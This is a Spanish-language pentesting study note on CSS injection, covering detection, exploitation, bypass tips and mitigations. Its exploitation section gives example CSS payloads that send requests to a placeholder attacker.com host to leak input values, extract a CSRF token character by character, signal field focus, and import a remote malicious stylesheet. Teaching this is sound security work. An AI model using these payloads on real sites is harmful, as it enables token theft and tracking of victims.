
---
Tags: #websecurity #cssi #injection #webvulns #bugbounty #pentesting

---
# 🎨 CSS Injection (CSSI)

## 📌 Definición
La **inyección de CSS (Cascading Style Sheets Injection)** ocurre cuando una aplicación web permite al atacante **inyectar reglas CSS arbitrarias** dentro de la respuesta que verá la víctima.

Sucede cuando la aplicación inserta contenido del usuario en:
- Atributos de estilo (`style`)
- Archivos `.css` dinámicos

Aunque parezca “cosmético”, puede usarse para:
- **Fingerprinting / Tracking** de usuarios
- **Exfiltración de datos sensibles** (tokens CSRF, emails)
- **Phishing visual**
- **Soporte para ataques más grandes** (como XSS encadenado)

---

## 🔎 Métodos de Detección

1. Revisar inputs reflejados en **estilos inline**
   ```html
   <div style="color: USERINPUT;">
   ```

Comprobar inputs en archivos .css servidos dinámicamente

http://victima.com/style.css?theme=dark

Observar comportamiento extraño en frontend al modificar parámetros como:

- Colores (color, background, border)

- Clases dinámicas (class=)

- Atributos de estilo (style=)

	**Herramientas útiles:**

- Burp Suite (Repeater / Intruder)

- ZAP Proxy

- Extensiones de navegador que muestran CSS aplicado

---

## 💥 Métodos de Explotación

1. Cambiar apariencia visual
```css
<style>
  body { background: red; }
  h1 { display: none; }
</style>
```

Útil para phishing visual: ocultar botones o mover formularios.

2. Fingerprinting de usuarios
```css
input[value*="admin"] {
  background: url("http://attacker.com/leak?admin");
}
```

Si el valor coincide, el navegador realiza la petición al atacante.

Permite identificar roles, nombres o correos.

3. Exfiltración de contenido sensible
```css
input[name=csrf][value^="A"] {
  background: url("http://attacker.com/leak?A");
}
```

Envía petición solo si el valor empieza por A.

Repetir para extraer un token carácter por carácter.

4. Keylogging visual (limitado)
```css
input:focus {
  background: url("http://attacker.com/keylog");
}
```

Cada vez que el usuario enfoca un campo, se envía una petición al atacante.

⚙️ Técnicas Avanzadas
Encadenar con XSS para ataques más completos.

Bypass de filtros: Unicode, comentarios (/* */), notación alternativa (\0000).

Uso de @import:
```css
@import url("http://attacker.com/malicious.css");
```

---

# 🚨 Mitigaciones
Escapar y validar entradas de usuario que impacten en estilos.

No permitir datos dinámicos en archivos CSS.

Content Security Policy (CSP) estricta: bloquear style-src y @import.

Evitar inline styles dinámicos generados desde input de usuario.
